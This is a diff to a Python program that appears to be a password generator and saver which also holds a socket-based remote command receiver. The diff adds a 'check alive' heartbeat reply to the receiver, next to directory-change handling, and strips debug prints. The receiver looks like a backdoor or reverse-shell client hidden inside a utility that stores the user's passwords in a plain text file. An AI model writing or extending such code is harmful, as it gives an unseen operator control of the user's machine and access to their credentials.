@@ -34,26 +34,24 @@ def recv_commands():
                 commands_process.close()
                 return
             if new_msg:
-                #print("new msg len:",msg[:HEADERSIZE])
                 msglength = msg[:HEADERSIZE].decode("utf-8")
-                #print("msg length {}".format(msglength.strip(" ")))
                 try:
                     msglen = int(msglength)
                 except ValueError:
                     continue
                 new_msg = False
 
-            #print(f"full message length: {msglen}")
-
             full_msg += msg.decode("utf-8")
-
-            #print(len(full_msg))
 
 
             if len(full_msg)-HEADERSIZE == msglen:
                 full_msg = full_msg[HEADERSIZE:]
+                if full_msg == "check alive test":
+                    s.send(bytes("he", "utf-8"))
+                    full_msg = ""
+                    new_msg = True
+                    continue
                 if "cd" in full_msg:
-                    #print("testt")
                     try:
                         os.chdir(full_msg[3:])
                     except:
@@ -132,10 +130,6 @@ def savepassword():
                         pyautogui.alert(text="Password Saved! see it at Passwords.txt")
                         textf.close()
                         break
-            # with open("Passwords.txt", "ar" ) as textf:
-            # password_to_save = genpass_display_text_field.get("1.0", "end")
-            # textf.write("\n" + password_to_save)
-            # pyautogui.alert(text="Password Saved! see it at Passwords.txt")
         except FileNotFoundError:
             cr = open("Passwords.txt", "x")
 
